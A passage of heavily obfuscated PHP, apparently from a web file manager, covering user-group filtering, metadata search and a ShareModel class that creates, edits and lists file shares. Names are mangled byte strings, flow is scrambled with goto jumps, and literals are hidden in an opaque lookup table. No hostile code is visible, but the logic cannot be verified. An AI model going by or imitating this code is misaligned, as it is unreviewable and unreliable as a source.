$Cèâ©óß¢†[$f„™ªùÍà¨[361]] = array_unique_by_key($a”­ßØµÇƒ, $f„™ªùÍà¨[1490]); $Cèâ©óß¢†[$f„™ªùÍà¨[358]][$f„™ªùÍà¨[359]] = count($Cèâ©óß¢†[$f„™ªùÍà¨[361]]); $Cèâ©óß¢†[$f„™ªùÍà¨[358]][$f„™ªùÍà¨[360]] = ceil($Cèâ©óß¢†[$f„™ªùÍà¨[358]][$f„™ªùÍà¨[359]] / $Cèâ©óß¢†[$f„™ªùÍà¨[358]][$f„™ªùÍà¨[356]]); } $this->_listDataApply($Cèâ©óß¢†[$f„™ªùÍà¨[361]]); goto b¨¦îß–Øê; Dğî´Ü‚ø¯: } private function _filterByGroup(&$aˆ¿Ø…óµ×, $eá—ššî”È) { $bÅğÑÃÈ¢– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$eá—ššî”È) { return $aˆ¿Ø…óµ×; } foreach ($aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[361]] as $F•…ò˜™öŒ => &$eƒ÷Ãºİ…) { $C¸Ûš´… = array_to_keyvalue($eƒ÷Ãºİ…[$bÅğÑÃÈ¢–[1825]], $bÅğÑÃÈ¢–[33], $bÅğÑÃÈ¢–[1650]); if (!in_array($eá—ššî”È, $C¸Ûš´…)) { unset($aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[361]][$F•…ò˜™öŒ]); } } unset($eƒ÷Ãºİ…); $aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[361]] = array_values($aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[361]]); $aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[358]] = array($bÅğÑÃÈ¢–[1888] => count($aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[361]]), $bÅğÑÃÈ¢–[1886] => $aˆ¿Ø…óµ×[$bÅğÑÃÈ¢–[358]][$bÅğÑÃÈ¢–[356]], $bÅğÑÃÈ¢–[1885] => 1, $bÅğÑÃÈ¢–[1887] => 1); } private function _searchFromMeta($aêÜŸ‚ÎÊº, $cä¤Á«ô£«, $A„¤ŒÑ© ª) { goto CÔºØ´Ü¬”; CÔºØ´Ü¬”: $A‚ ÖĞ¶­§ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cä¤Á«ô£« = strtolower($cä¤Á«ô£«); $Eì´¿Ìïàå = array($A‚ ÖĞ¶­§[89] => $aêÜŸ‚ÎÊº, $A‚ ÖĞ¶­§[366] => array($A‚ ÖĞ¶­§[373], "\x25{$cä¤Á«ô£«}\x25")); goto Fä•‡ªø¥¡; Fä•‡ªø¥¡: $Eì´¿Ìïàå = $this->parseWhereLike($Eì´¿Ìïàå); $dÅ„õĞ¥ŸÃ = Model($A‚ ÖĞ¶­§[2108])->where($Eì´¿Ìïàå)->limit($A„¤ŒÑ© ª)->select(); if (!$dÅ„õĞ¥ŸÃ) { return array(); } goto f£•ôÕ»¹Î; A÷’› Šáœ: return $c—¶»íÆ¼á; goto aœòÂòæò; f£•ôÕ»¹Î: $dÅ„õĞ¥ŸÃ = array_to_keyvalue($dÅ„õĞ¥ŸÃ, $A‚ ÖĞ¶­§[33], $A‚ ÖĞ¶­§[1490]); $c—¶»íÆ¼á = $this->where(array($A‚ ÖĞ¶­§[1482] => array($A‚ ÖĞ¶­§[7], $dÅ„õĞ¥ŸÃ)))->select(); if (!$c—¶»íÆ¼á) { return array(); } goto A÷’› Šáœ; aœòÂòæò: } private function _listDataApplyItem($BÖğ†âÚğˆ) { $e¯²ï„Ä¶¡ = array($BÖğ†âÚğˆ); $this->_listDataApply($e¯²ï„Ä¶¡); return $e¯²ï„Ä¶¡[0]; } private function _listDataApply(&$C´öêòÍ“) { goto B‡ƒéš¢¯ç; B‡ƒéš¢¯ç: $cŠ‡È‚§ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$C´öêòÍ“) { return; } array_remove_key($C´öêòÍ“, $cŠ‡È‚§[814]); goto Fä—ªí‹†; f ×¥˜Ï¦Ù: $this->_listAppendSourceRoot($C´öêòÍ“, $a£å²ŠÇ…ª); goto d«½‡Ê•×î; Fä—ªí‹†: $a£å²ŠÇ…ª = array_to_keyvalue($C´öêòÍ“, $cŠ‡È‚§[33], $cŠ‡È‚§[1490]); $this->_listAppendGroup($C´öêòÍ“, $a£å²ŠÇ…ª); $this->_listAppendMeta($C´öêòÍ“, $a£å²ŠÇ…ª); goto f ×¥˜Ï¦Ù; d«½‡Ê•×î: } private function _listAppendSourceRoot(&$Eœ‰´Äˆ©›, $Fó»Àˆœ°Ø) { goto DÆ†Š‡ÃøÏ; DÆ†Š‡ÃøÏ: $b“£ŠêêÅ¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÄ„ù©ò¤ = array($b“£ŠêêÅ¨[478] => 0, $b“£ŠêêÅ¨[387] => SourceModel::TYPE_USER, $b“£ŠêêÅ¨[473] => array($b“£ŠêêÅ¨[7], $Fó»Àˆœ°Ø)); $e¹ö¸Àº» = $b“£ŠêêÅ¨[1746]; goto FĞµ‹ØÆÁ®; FĞµ‹ØÆÁ®: $dÙìÏ—á®¼ = Model($b“£ŠêêÅ¨[759])->order($b“£ŠêêÅ¨[1747])->field($e¹ö¸Àº»)->where($BÄ„ù©ò¤)->select(); $dÙìÏ—á®¼ = array_to_keyvalue($dÙìÏ—á®¼, $b“£ŠêêÅ¨[473]); $dÙìÏ—á®¼ = array_remove_key($dÙìÏ—á®¼, $b“£ŠêêÅ¨[473]); goto d¦ğí¡éÍÉ; d¦ğí¡éÍÉ: foreach ($Eœ‰´Äˆ©› as &$C…ÔãïÉ‘) { $C…ÔãïÉ‘[$b“£ŠêêÅ¨[407]] = $dÙìÏ—á®¼[$C…ÔãïÉ‘[$b“£ŠêêÅ¨[1490]]] ? $dÙìÏ—á®¼[$C…ÔãïÉ‘[$b“£ŠêêÅ¨[1490]]] : array(); } unset($C…ÔãïÉ‘); goto B³Ô‰ñ¤„ä; B³Ô‰ñ¤„ä: } private function _listAppendGroup(&$C–÷‡ÜîšŠ, $Fãç‘ãôİ‡) { goto fæ§ÛÉ˜; D­ÖÄ…˜­Ó: $F‡¸†”ëº = array($aŞÎİÂ«»[1650] => array($aŞÎİÂ«»[7], $d­†§¡ˆŒ³)); $fìµÔ×á¹Š = Model($aŞÎİÂ«»[1823])->field($aŞÎİÂ«»[2109])->where($F‡¸†”ëº)->select(); $fìµÔ×á¹Š = array_to_keyvalue($fìµÔ×á¹Š, $aŞÎİÂ«»[1650]); goto E¶‰”´âç«; fæ§ÛÉ˜: $aŞÎİÂ«» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F‡¸†”ëº = array($aŞÎİÂ«»[1490] => array($aŞÎİÂ«»[7], $Fãç‘ãôİ‡)); $aÉ˜ôŠ„ä = Model($aŞÎİÂ«»[1733])->where($F‡¸†”ëº)->select(); goto dòŒ Ï‘ã; E¶‰”´âç«: $aÉ˜ôŠ„ä = array_to_keyvalue_group($aÉ˜ôŠ„ä, $aŞÎİÂ«»[1490]); foreach ($aÉ˜ôŠ„ä as &$BÍÑÈŠÔÔâ) { $B¾½è‚Æßµ = array(); foreach ($BÍÑÈŠÔÔâ as $e§îÚ‘ù¸) { if (!$e§îÚ‘ù¸[$aŞÎİÂ«»[1799]]) { continue; } $EíÌÒ‚ŞÖ = Model($aŞÎİÂ«»[1819])->listData($e§îÚ‘ù¸[$aŞÎİÂ«»[1799]]); $B¾½è‚Æßµ[] = array($aŞÎİÂ«»[1650] => $e§îÚ‘ù¸[$aŞÎİÂ«»[1650]], $aŞÎİÂ«»[2110] => $fìµÔ×á¹Š[$e§îÚ‘ù¸[$aŞÎİÂ«»[1650]]][$aŞÎİÂ«»[28]], $aŞÎİÂ«»[476] => $fìµÔ×á¹Š[$e§îÚ‘ù¸[$aŞÎİÂ«»[1650]]][$aŞÎİÂ«»[476]], $aŞÎİÂ«»[392] => $EíÌÒ‚ŞÖ); } $BÍÑÈŠÔÔâ = $B¾½è‚Æßµ; } unset($BÍÑÈŠÔÔâ); goto E—•êÈ±‘—; E—•êÈ±‘—: foreach ($C–÷‡ÜîšŠ as &$B†ŞÖ³àÎ) { $B†ŞÖ³àÎ[$aŞÎİÂ«»[1825]] = array(); if (isset($aÉ˜ôŠ„ä[$B†ŞÖ³àÎ[$aŞÎİÂ«»[1490]]])) { $B†ŞÖ³àÎ[$aŞÎİÂ«»[1825]] = $aÉ˜ôŠ„ä[$B†ŞÖ³àÎ[$aŞÎİÂ«»[1490]]]; } } unset($B†ŞÖ³àÎ); goto EÒ¹ÏæÜ½÷; dòŒ Ï‘ã: $d­†§¡ˆŒ³ = array_to_keyvalue($aÉ˜ôŠ„ä, $aŞÎİÂ«»[33], $aŞÎİÂ«»[1650]); $d­†§¡ˆŒ³ = array_remove_value(array_unique($d­†§¡ˆŒ³), $aŞÎİÂ«»[485]); if (!$d­†§¡ˆŒ³ || !$aÉ˜ôŠ„ä) { return; } goto D­ÖÄ…˜­Ó; EÒ¹ÏæÜ½÷: } private function _listAppendMeta(&$aç“É’‹ğŒ, $c“„•ªÅĞ) { goto dğÅø¦Ä‰; F¸›©ÉÉÔ¦: foreach ($bŸ—³‘·¹† as &$bó‘š©Éë) { $dê›İŸÛø = array(); foreach ($bó‘š©Éë as $A›Ğà’“ç) { if (!in_array($A›Ğà’“ç[$BÑ…ÀÒ°ë[89]], $dîººÔ¡Ô†)) { $dê›İŸÛø[$A›Ğà’“ç[$BÑ…ÀÒ°ë[89]]] = $A›Ğà’“ç[$BÑ…ÀÒ°ë[366]]; } } $bó‘š©Éë = $dê›İŸÛø; } unset($bó‘š©Éë); $F…‡ŠÙöÉÑ = Model($BÑ…ÀÒ°ë[2111]); goto AÉìöĞõ·è; F‹¦–Ä´å¡: $c–èÒ›†œÛ = array($BÑ…ÀÒ°ë[1490] => array($BÑ…ÀÒ°ë[7], $c“„•ªÅĞ)); $bŸ—³‘·¹† = Model($BÑ…ÀÒ°ë[2087])->where($c–èÒ›†œÛ)->select(); $bŸ—³‘·¹† = array_to_keyvalue_group($bŸ—³‘·¹†, $BÑ…ÀÒ°ë[1490]); goto F¸›©ÉÉÔ¦; AÉìöĞõ·è: foreach ($aç“É’‹ğŒ as &$dŸËÚ½î) { $DËÅÒŒğÅ  = array(); if (isset($bŸ—³‘·¹†[$dŸËÚ½î[$BÑ…ÀÒ°ë[1490]]])) { $DËÅÒŒğÅ  = $bŸ—³‘·¹†[$dŸËÚ½î[$BÑ…ÀÒ°ë[1490]]]; } $dŸËÚ½î[$BÑ…ÀÒ°ë[2112]] = array(); if (isset($DËÅÒŒğÅ [$FÈ„‘ìáŠ])) { $dŸËÚ½î[$BÑ…ÀÒ°ë[2112]] = $F…‡ŠÙöÉÑ->getUserJobInfo($DËÅÒŒğÅ [$FÈ„‘ìáŠ]); } } unset($dŸËÚ½î); goto E’Ÿ¡ê‘îò; dğÅø¦Ä‰: $BÑ…ÀÒ°ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÈ„‘ìáŠ = UserJobModel::JOB_KEY; $dîººÔ¡Ô† = array($BÑ…ÀÒ°ë[2089]); goto F‹¦–Ä´å¡; E’Ÿ¡ê‘îò: } protected function groupUserAll($eèãÑÈ‡—ó) { $b¿í™²ìêŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$eèãÑÈ‡—ó) { return !1; } $F‰ĞŠ‘Ëµò = Model($b¿í™²ìêŒ[1733])->field($b¿í™²ìêŒ[1490])->where(array($b¿í™²ìêŒ[1650] => array($b¿í™²ìêŒ[7], $eèãÑÈ‡—ó)))->select(); $F‰ĞŠ‘Ëµò = array_to_keyvalue($F‰ĞŠ‘Ëµò, $b¿í™²ìêŒ[33], $b¿í™²ìêŒ[1490]); return array_unique($F‰ĞŠ‘Ëµò); } public function userSearch($D—ÑâóÜ¡, $f‰²†¶„†… = "\x2a") { return Model($_SERVER[ÈİÅ¿ÈÈ¥×][494])->where($D—ÑâóÜ¡)->field($f‰²†¶„†…)->find(); } } goto F³‡­Âï; BĞÎá»¾Ä: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\x69\155\145", "\164\x69\x6d\145", "\151\x6e\163\x65\x72\164\54\x75\x70\144\141\x74\145", "\x66\x75\156\143\x74\x69\157\156"), array("\143\162\145\141\164\x65\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\x73\145\x72\164", "\x66\165\156\143\x74\151\157\x6e"), array("\157\x70\x74\x69\157\156\x73", '', "\151\156\x73\x65\162\x74\54\165\x70\144\141\164\145\54\163\145\154\145\143\164", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($BÈ•ˆ‹‰ØÆ) { $C¾‘•îÛ®Ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a»·’”£Â÷ = isset($BÈ•ˆ‹‰ØÆ[0]) ? $BÈ•ˆ‹‰ØÆ[0] : !1; return array($C¾‘•îÛ®Ù[1776] => array(USER_ID, $C¾‘•îÛ®Ù[1777]), $C¾‘•îÛ®Ù[1725] => array($a»·’”£Â÷, $C¾‘•îÛ®Ù[1778])); } protected function listSimple() { $D‰•¸ì‘¨« = array($_SERVER[ÈİÅ¿ÈÈ¥×][1490] => USER_ID); $FöŠàÉ–„ä = $this->field($this->fieldList)->where($D‰•¸ì‘¨«)->select(); return $FöŠàÉ–„ä ? $FöŠàÉ–„ä : array(); } protected function getInfo($C’äœÆè, $Dˆ‘ã…¡À÷ = false) { $DÁß¾¥Š‡  =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($Dˆ‘ã…¡À÷) { return $this->_getShareInfo(array($DÁß¾¥Š‡ [456] => $C’äœÆè)); } $bà›Œ¬ä´” = $this->cacheFunctionGet($DÁß¾¥Š‡ [1779], $C’äœÆè); return $bà›Œ¬ä´”; } public function getInfoByHash($f°‹ìÙ“àÇ) { return $this->_getShareInfo(array($_SERVER[ÈİÅ¿ÈÈ¥×][458] => $f°‹ìÙ“àÇ)); } public function getInfoByPath($Dç°ÖÍšÄ) { $A£Ÿ¾¹šöÒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cğÍê¾ÏÎµ = array($A£Ÿ¾¹šöÒ[1490] => USER_ID, $A£Ÿ¾¹šöÒ[385] => $Dç°ÖÍšÄ); return $this->_getShareInfo($cğÍê¾ÏÎµ); } public function getInfoBySourcePath($a…éÔŞ§ÜÎ) { $b°®ğ¯†ŠÍ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a¶±óÄ ‹¹ = array($b°®ğ¯†ŠÍ[1490] => USER_ID, $b°®ğ¯†ŠÍ[1035] => $a…éÔŞ§ÜÎ); return $this->_getShareInfo($a¶±óÄ ‹¹); } private function _getShareInfo($CÓ§Ã°®ç¶) { goto cÄŒ‡ŒÍìˆ; f°ğÒ‘å¡ã: if ($e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[385]] == $DÚ¾ÅÛ…Ä[485]) { $e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[407]] = IO::info($e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[1035]]); } else { $e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[407]] = Model($DÚ¾ÅÛ…Ä[1167])->pathInfo($e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[385]]); } $e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[1781]] = $A¯…ï¡ÄÎŠ; return $e­÷Û¸¸êê; goto FŸÌ¯™Ì; bö±£ÁİÕÛ: $CÓ§Ã°®ç¶ = array($DÚ¾ÅÛ…Ä[456] => $e­÷Û¸¸êê[$DÚ¾ÅÛ…Ä[456]]); $bËÑëŠ“ß„ = $DÚ¾ÅÛ…Ä[1780]; $A¯…ï¡ÄÎŠ = Model($DÚ¾ÅÛ…Ä[553])->order($DÚ¾ÅÛ…Ä[383])->field($bËÑëŠ“ß„)->where($CÓ§Ã°®ç¶)->select(); goto f°ğÒ‘å¡ã; cÄŒ‡ŒÍìˆ: $DÚ¾ÅÛ…Ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e­÷Û¸¸êê = $this->where($CÓ§Ã°®ç¶)->find(); if (!$e­÷Û¸¸êê) { return !1; } goto bö±£ÁİÕÛ; FŸÌ¯™Ì: } protected function getInfoAuth($f¶¤Ì±ï†Ò) { $Dò´Æø’Œ• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÎ’ƒèĞˆÄ = $this->getInfo($f¶¤Ì±ï†Ò); $DÎ’ƒèĞˆÄ[$Dò´Æø’Œ•[392]] = Model($Dò´Æø’Œ•[471])->authMake($DÎ’ƒèĞˆÄ[$Dò´Æø’Œ•[1781]]); return $DÎ’ƒèĞˆÄ; } protected function listData($DŠ‰ õŞ› = null, $E¤ÒÀ£ÉÛÏ = 300) { $Aù«¶›ĞÑ´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÈë…ïæï = array(array($Aù«¶›ĞÑ´[461] => array($Aù«¶›ĞÑ´[934], 0), $Aù«¶›ĞÑ´[463] => array($Aù«¶›ĞÑ´[934], 0), $Aù«¶›ĞÑ´[1782] => $Aù«¶›ĞÑ´[1739])); if ($DŠ‰ õŞ› == $Aù«¶›ĞÑ´[1783]) { $fÈë…ïæï = array($Aù«¶›ĞÑ´[461] => 1); } else { if ($DŠ‰ õŞ› == $Aù«¶›ĞÑ´[1020]) { $fÈë…ïæï = array($Aù«¶›ĞÑ´[463] => 1); } } $fÈë…ïæï[$Aù«¶›ĞÑ´[1490]] = USER_ID; $BÏ¨İİÜäæ = $this->where($fÈë…ïæï)->selectPage($E¤ÒÀ£ÉÛÏ); return $BÏ¨İİÜäæ; } protected function listToMe($eÁÔÉ©£Û = 300) { goto Aì‰‹¤È¦Ó; Aì‰‹¤È¦Ó: $DƒÇõÁ¶ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÏİ¦©ÙÜ³ = Model($DƒÇõÁ¶ö[1784])->userGroupParents(USER_ID); $eîŒ˜÷ùïå = array($DƒÇõÁ¶ö[538] => SourceModel::TYPE_USER, $DƒÇõÁ¶ö[473] => USER_ID); goto f›‡“À¾Éã; f•Ô¾Ÿ—•ô: $b‘´Â¿®Ÿ² = array($DƒÇõÁ¶ö[1786] => $c†”é·¡ƒ¨, $DƒÇõÁ¶ö[1787] => $E–Ø„Œ…[$DƒÇõÁ¶ö[358]]); return $b‘´Â¿®Ÿ²; goto EË‘“…ƒø­; f×ñ´œ‘ÃÕ: if (!$dºë¤îî·Š) { return $E–Ø„Œ…; } $Fœ«ˆ‰¿ìè = $DƒÇõÁ¶ö[1785]; $eîŒ˜÷ùïå = array($DƒÇõÁ¶ö[456] => array($DƒÇõÁ¶ö[400], array_keys($dºë¤îî·Š))); goto E²×òÉéŞ; E²×òÉéŞ: $c†”é·¡ƒ¨ = $this->field($Fœ«ˆ‰¿ìè)->where($eîŒ˜÷ùïå)->select(); foreach ($c†”é·¡ƒ¨ as $c‡Úòìã…Â => &$F®ğíÆĞ‚) { $F®ğíÆĞ‚[$DƒÇõÁ¶ö[1781]] = $dºë¤îî·Š[$F®ğíÆĞ‚[$DƒÇõÁ¶ö[456]]]; } unset($F®ğíÆĞ‚); goto f•Ô¾Ÿ—•ô; f›‡“À¾Éã: if ($cÏİ¦©ÙÜ³) { $eîŒ˜÷ùïå = array(array($DƒÇõÁ¶ö[538] => SourceModel::TYPE_USER, $DƒÇõÁ¶ö[473] => USER_ID), array($DƒÇõÁ¶ö[538] => SourceModel::TYPE_GROUP, $DƒÇõÁ¶ö[473] => array($DƒÇõÁ¶ö[7], $cÏİ¦©ÙÜ³)), $DƒÇõÁ¶ö[1782] => $DƒÇõÁ¶ö[1739]); } $E–Ø„Œ… = Model($DƒÇõÁ¶ö[553])->where($eîŒ˜÷ùïå)->selectPage($eÁÔÉ©£Û); $dºë¤îî·Š = array_to_keyvalue_group($E–Ø„Œ…[$DƒÇõÁ¶ö[361]], $DƒÇõÁ¶ö[456]); goto f×ñ´œ‘ÃÕ; EË‘“…ƒø­: } protected function shareAdd($Bùôè—¶õâ, $BéÌ¢õ½) { $EäÕä¨’âÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bª‘‰‰ö’Ê = $this->_addShareData($Bùôè—¶õâ, $BéÌ¢õ½); if (!empty($BéÌ¢õ½[$EäÕä¨’âÆ[1788]])) { $this->_shareAuthSet($bª‘‰‰ö’Ê, $BéÌ¢õ½[$EäÕä¨’âÆ[1788]]); } $this->shareEventAdd($Bùôè—¶õâ, $BéÌ¢õ½, $EäÕä¨’âÆ[1023]); return $bª‘‰‰ö’Ê; } private function shareEventAdd($BÕ ŒğİÇé, $FÇ©Ù„ïÇ, $Dâ ôÎ²Ë = "\x61\144\x64") { goto fÃËó‚ø”; C™«”ÖãÅ: return; goto d¦ÎÒã¥Å‰; fÃËó‚ø”: $dƒˆ©ÚĞÜš =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($Dâ ôÎ²Ë == $dƒˆ©ÚĞÜš[1023]) { if ($FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[461]] == $dƒˆ©ÚĞÜš[83]) { Model($dƒˆ©ÚĞÜš[522])->eventShare($BÕ ŒğİÇé, $dƒˆ©ÚĞÜš[1789]); } if ($FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[463]] == $dƒˆ©ÚĞÜš[83]) { Model($dƒˆ©ÚĞÜš[522])->eventShare($BÕ ŒğİÇé, $dƒˆ©ÚĞÜš[1790]); } return; } $EñˆšŠĞ˜ = $this->getInfoByPath($BÕ ŒğİÇé); goto a˜šØ½ñ; a˜šØ½ñ: $cæÏ‹ªËÌ = $dƒˆ©ÚĞÜš[1791]; if ($EñˆšŠĞ˜[$dƒˆ©ÚĞÜš[461]] == $dƒˆ©ÚĞÜš[485] && $FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[461]] == $dƒˆ©ÚĞÜš[83]) { $cæÏ‹ªËÌ = $dƒˆ©ÚĞÜš[1789]; } if ($EñˆšŠĞ˜[$dƒˆ©ÚĞÜš[461]] == $dƒˆ©ÚĞÜš[83] && $FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[461]] == $dƒˆ©ÚĞÜš[485]) { $cæÏ‹ªËÌ = $dƒˆ©ÚĞÜš[1792]; } goto b†ÑÜ„±¬; b†ÑÜ„±¬: if ($EñˆšŠĞ˜[$dƒˆ©ÚĞÜš[463]] == $dƒˆ©ÚĞÜš[485] && $FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[463]] == $dƒˆ©ÚĞÜš[83]) { $cæÏ‹ªËÌ = $dƒˆ©ÚĞÜš[1790]; } if ($EñˆšŠĞ˜[$dƒˆ©ÚĞÜš[463]] == $dƒˆ©ÚĞÜš[83] && $FÇ©Ù„ïÇ[$dƒˆ©ÚĞÜš[463]] == $dƒˆ©ÚĞÜš[485]) { $cæÏ‹ªËÌ = $dƒˆ©ÚĞÜš[1793]; } Model($dƒˆ©ÚĞÜš[522])->eventShare($BÕ ŒğİÇé, $cæÏ‹ªËÌ); goto C™«”ÖãÅ; d¦ÎÒã¥Å‰: } private function _addShareData($AÀõ†ˆŸĞ, $eŸ¯·‘¦¤ = array()) { goto f„òßÕ¦Ù; C›ŞİäÚ†: $f¤£áÏÊáè = array($fÙ­âÅÌá[1482] => USER_ID, $fÙ­âÅÌá[399] => $AÀõ†ˆŸĞ, $fÙ­âÅÌá[1395] => $fÙ­âÅÌá[33], $fÙ­âÅÌá[461] => 0, $fÙ­âÅÌá[463] => 0, $fÙ­âÅÌá[1035] => $fÙ­âÅÌá[33], $fÙ­âÅÌá[301] => $fÙ­âÅÌá[33], $fÙ­âÅÌá[814] => $fÙ­âÅÌá[33], $fÙ­âÅÌá[1795] => 0, $fÙ­âÅÌá[1796] => 0, $fÙ­âÅÌá[464] => 0, $fÙ­âÅÌá[465] => $fÙ­âÅÌá[33], $fÙ­âÅÌá[458] => $fÙ­âÅÌá[33]); $EâİŠïÀÖ = explode($fÙ­âÅÌá[47], $fÙ­âÅÌá[1797]); foreach ($EâİŠïÀÖ as $aÇÀ‰ĞÅœÒ) { if (!isset($eŸ¯·‘¦¤[$aÇÀ‰ĞÅœÒ])) { continue; } $f¤£áÏÊáè[$aÇÀ‰ĞÅœÒ] = $eŸ¯·‘¦¤[$aÇÀ‰ĞÅœÒ]; } goto fô˜ÛöÀÇÔ; dç˜Ú‹Ïô: if ($B“öÑ÷ë‚ = $this->where($cö‰ŠÎÅ„³)->find()) { return $B“öÑ÷ë‚[$fÙ­âÅÌá[456]]; } if ($AÀõ†ˆŸĞ == 0) { $eó²¥ßà‚Ô = array($fÙ­âÅÌá[28] => get_path_this($eŸ¯·‘¦¤[$fÙ­âÅÌá[75]])); } else { $eó²¥ßà‚Ô = Model($fÙ­âÅÌá[759])->sourceInfo($AÀõ†ˆŸĞ); if (!$eó²¥ßà‚Ô) { return !1; } } if (!$eŸ¯·‘¦¤[$fÙ­âÅÌá[1395]]) { $eŸ¯·‘¦¤[$fÙ­âÅÌá[1395]] = $eó²¥ßà‚Ô[$fÙ­âÅÌá[28]]; } goto C›ŞİäÚ†; eêê‚à›”: return $BˆóÎÉ„½; goto Eªœƒ“Ó“; fô˜ÛöÀÇÔ: $BˆóÎÉ„½ = $this->add($f¤£áÏÊáè); $A…†ä‹Ç´´ = array($fÙ­âÅÌá[458] => short_id($BˆóÎÉ„½)); $this->where(array($fÙ­âÅÌá[455] => $BˆóÎÉ„½))->save($A…†ä‹Ç´´); goto eêê‚à›”; f„òßÕ¦Ù: $fÙ­âÅÌá =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cö‰ŠÎÅ„³ = array($fÙ­âÅÌá[399] => $AÀõ†ˆŸĞ, $fÙ­âÅÌá[1482] => USER_ID); if ($AÀõ†ˆŸĞ == 0) { $cö‰ŠÎÅ„³ = array($fÙ­âÅÌá[1794] => $eŸ¯·‘¦¤[$fÙ­âÅÌá[1035]], $fÙ­âÅÌá[1482] => USER_ID); } goto dç˜Ú‹Ïô; Eªœƒ“Ó“: } private function _shareAuthSet($CÃ÷Ö‘«Ú, $CòîËÊ¹ï ) { goto CƒåË›…¡Ñ; F¡œ©Ã˜: return $D´Å¼³á÷¯->addAll($e¬°„Ç×‚Ù, array(), !0); goto eœ˜ÍˆÅç; CƒåË›…¡Ñ: $bŠ«µ÷Æ¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_array($CòîËÊ¹ï )) { return !1; } $D´Å¼³á÷¯ = Model($bŠ«µ÷Æ¯[1798]); goto c¬ê¹ƒÉ ; c¬ê¹ƒÉ : $D´Å¼³á÷¯->where(array($bŠ«µ÷Æ¯[456] => $CÃ÷Ö‘«Ú))->delete(); $e¬°„Ç×‚Ù = array(); foreach ($CòîËÊ¹ï  as $C“ëŒÀÊä) { $eÉô—°‚° = SourceModel::TYPE_USER; if ($C“ëŒÀÊä[$bŠ«µ÷Æ¯[387]] == SourceModel::TYPE_GROUP) { $eÉô—°‚° = SourceModel::TYPE_GROUP; } $E™ˆîÓÎØ = array($bŠ«µ÷Æ¯[456] => $CÃ÷Ö‘«Ú, $bŠ«µ÷Æ¯[387] => $eÉô—°‚°, $bŠ«µ÷Æ¯[473] => intval($C“ëŒÀÊä[$bŠ«µ÷Æ¯[473]]), $bŠ«µ÷Æ¯[1799] => 0, $bŠ«µ÷Æ¯[1800] => -1); if ($C“ëŒÀÊä[$bŠ«µ÷Æ¯[1799]]) { $E™ˆîÓÎØ[$bŠ«µ÷Æ¯[1799]] = $C“ëŒÀÊä[$bŠ«µ÷Æ¯[1799]]; } else { if ($C“ëŒÀÊä[$bŠ«µ÷Æ¯[1800]]) { $E™ˆîÓÎØ[$bŠ«µ÷Æ¯[1800]] = $C“ëŒÀÊä[$bŠ«µ÷Æ¯[1800]]; } } $e¬°„Ç×‚Ù[] = $E™ˆîÓÎØ; } goto F¡œ©Ã˜; eœ˜ÍˆÅç: } public function numViewAdd($DõÈİõ¼Çõ) { $B»¥å”Å¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aá²³ø†¢ = array($B»¥å”Å¼[455] => $DõÈİõ¼Çõ); $this->where($aá²³ø†¢)->setAdd($B»¥å”Å¼[1795]); } public function numDownloadAdd($AÌ‚îÆ‘“) { $bï›‡Ò¢°Ş =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E Ø²³»¢ = array($bï›‡Ò¢°Ş[455] => $AÌ‚îÆ‘“); $this->where($E Ø²³»¢)->setAdd($bï›‡Ò¢°Ş[1796]); } protected function shareEdit($dŒÑØ‘’™™, $Aäé‘ğùì¾) { goto cœ¿™»±˜¥; cœ¿™»±˜¥: $D‚³ìÜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F“¥Ñ´êìÏ = $this->getInfo($dŒÑØ‘’™™); if (!$F“¥Ñ´êìÏ) { return !1; } goto f‹‰õõİÁÁ; BºãêºÊ‚ö: foreach ($c´Îïï´† as $EƒÑ†•ˆÛˆ) { if (!array_key_exists($EƒÑ†•ˆÛˆ, $Aäé‘ğùì¾)) { continue; } $Cíğ±ÄùÌ[$EƒÑ†•ˆÛˆ] = $Aäé‘ğùì¾[$EƒÑ†•ˆÛˆ]; } $this->shareEventAdd($F“¥Ñ´êìÏ[$D‚³ìÜ[385]], $Aäé‘ğùì¾, $D‚³ìÜ[1617]); $this->where(array($D‚³ìÜ[455] => $dŒÑØ‘’™™))->save($Cíğ±ÄùÌ); goto e¤˜¼„œØĞ; f‹‰õõİÁÁ: $this->_checkLinkShare($Aäé‘ğùì¾, 